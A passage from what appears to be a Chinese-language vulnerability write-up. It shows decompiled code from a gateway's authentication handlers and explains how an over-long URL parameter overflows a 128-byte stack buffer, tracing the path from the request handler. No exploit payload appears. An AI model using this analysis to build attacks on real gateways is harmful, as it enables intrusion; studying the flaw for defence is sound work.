&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1441800&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_5:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_6;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#a6e22e">strncmp&lt;/span>(v8 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;start&amp;amp;&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">6LL&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v19 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">29&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v20 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">29LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v21 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#a6e22e">strncmp&lt;/span>(v8 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;done&amp;amp;&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">5LL&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1441801&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_5;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v19 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">28&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v20 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">28LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v21 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> v21;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> v20 &lt;span style="color:#f92672">+&lt;/span> v8;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v22 &lt;span style="color:#f92672">=&lt;/span> v3 &lt;span style="color:#f92672">+&lt;/span> v19;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1441802&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v27 &lt;span style="color:#f92672">=&lt;/span> v22;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#a6e22e">strncmp&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;target=&amp;#34;&lt;/span>, v5, &lt;span style="color:#ae81ff">7LL&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_6;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v23 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">_wrap_memchr&lt;/span>(v5 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>, &lt;span style="color:#ae81ff">38LL&lt;/span>, (&lt;span style="color:#66d9ef">int&lt;/span>)(v22 &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v24 &lt;span style="color:#f92672">=&lt;/span> v22 &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v25 &lt;span style="color:#f92672">=&lt;/span> v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (_DWORD)v25 &lt;span style="color:#f92672">!=&lt;/span> v22 &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_6:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> v29;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v26 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ns_aaa_saml_url_decode&lt;/span>(v5 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>, a2, v25);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>ns_aaa_gwtest_get_event_and_target_names&lt;/code>由&lt;code>ns_aaa_gwtest_get_valid_fsso_server&lt;/code>调用，其中v15为栈内char数组，大小为128字节。分析到这可以猜测，由于请求url的参数可控，自然请求url长度也可控，而v15这个数组为栈内数组，大小为128字节。&lt;code>ns_aaa_saml_url_decode_inner&lt;/code>函数中循环次数由url长度决定，也就是可以控制写入v15数组的字节数，如果url过长则在循环时写入的字节数超过128字节，造成栈溢出。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">ns_aaa_gwtest_get_valid_fsso_server&lt;/span>(&lt;span style="color:#66d9ef">__int64&lt;/span> a1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> v1; &lt;span style="color:#75715e">// rbx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v2; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v4; &lt;span style="color:#75715e">// r8d
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v5; &lt;span style="color:#75715e">// r9d
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span> v6; &lt;span style="color:#75715e">// ax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v7; &lt;span style="color:#75715e">// r8d
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v8; &lt;span style="color:#75715e">// r9d
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v9; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v10; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v11; &lt;span style="color:#75715e">// ecx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">bool&lt;/span> v12; &lt;span style="color:#75715e">// cf
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v13; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v14; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> __int128 v15[&lt;span style="color:#ae81ff">8&lt;/span>]; &lt;span style="color:#75715e">// [rsp+10h] [rbp-A0h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v16; &lt;span style="color:#75715e">// [rsp+94h] [rbp-1Ch] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v17; &lt;span style="color:#75715e">// [rsp+98h] [rbp-18h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v18[&lt;span style="color:#ae81ff">3&lt;/span>]; &lt;span style="color:#75715e">// [rsp+A4h] [rbp-Ch] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset&lt;/span>(v15, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#66d9ef">sizeof&lt;/span>(v15));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v16 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v18[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#a6e22e">ns_aaa_gwtest_get_event_and_target_names&lt;/span>(a1, (&lt;span style="color:#66d9ef">__int64&lt;/span>)v15, &lt;span style="color:#f92672">&amp;amp;&lt;/span>v16) )
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>向上追溯调用到该函数需要的路径，&lt;code>ns_aaa_gwtest_get_valid_fsso_server&lt;/code>由&lt;code>ns_aaa_gwtest_handler&lt;/code>调用，在代码中可以看到当请求url+8处为formssso时才会进入到调用&lt;code>ns_aaa_gwtest_get_valid_fsso_server&lt;/code>函数的逻辑。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">ns_aaa_gwtest_handler&lt;/span>(&lt;span style="color:#66d9ef">__int64&lt;/span> a1, &lt;span style="color:#66d9ef">__int64&lt;/span> a2, &lt;span style="color:#66d9ef">__int64&lt;/span> a3, &lt;span style="color:#66d9ef">__int64&lt;/span> a4)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> v5; &lt;span style="color:#75715e">// r15
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v6; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v7; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> _QWORD &lt;span style="color:#f92672">*&lt;/span>v8; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v9; &lt;span style="color:#75715e">// r13d
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> valid_fsso_server; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v11; &lt;span style="color:#75715e">// rbx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v12; &lt;span style="color:#75715e">// r14d
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v13; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> is_valid_auth_action; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v15; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v16; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v17; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v18; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v20; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v21; &lt;span style="color:#75715e">// rdx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v22; &lt;span style="color:#75715e">// [rsp+0h] [rbp-30h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> a3;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> ns_async_ctx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( ns_async_ctx )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v20 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)ns_async_callers_context_size;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(ns_async_ctx &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)ns_async_callers_context_size &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">108&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">1486&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">panic_0&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Incorrect context id in ASYNC_SAVE_CTX&amp;#34;&lt;/span>, a2, a3, (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)ns_async_callers_context_size, a4);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(ns_async_ctx &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)ns_async_callers_context_size &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">112&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(ns_async_ctx &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)ns_async_callers_context_size &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">116&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(ns_async_ctx &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)ns_async_callers_context_size &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">112&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v6 &lt;span style="color:#f92672">+&lt;/span> v20 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">116&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_41;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(a2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">36&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> (_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v7 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v7 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">0x20202020u&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">int&lt;/span>)a3 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>lmar&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (_DWORD)a3 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>&lt;span style="color:#f92672">?&lt;/span>dck&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_41;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (_DWORD)a3 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1752462689&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#f92672">*&lt;/span>v8 &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">0x2020202020202020LL&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>vreshtua&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(v7 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">0x2020&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">29285&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(_BYTE &lt;span style="color:#f92672">*&lt;/span>)(v7 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span>) &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">63&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> v9;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v22 &lt;span style="color:#f92672">=&lt;/span> a4;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> is_valid_auth_action &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ns_aaa_gwtest_is_valid_auth_action&lt;/span>(a2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( is_valid_auth_action )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> is_valid_auth_action;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_39;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">3907&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (_DWORD)a3 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>lluf&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> v9;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span> &lt;span style="color:#f92672">*&lt;/span> ((&lt;span style="color:#f92672">*&lt;/span>(_BYTE &lt;span style="color:#f92672">*&lt;/span>)(v7 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>) &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">63&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_20:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0LL&lt;/span>;
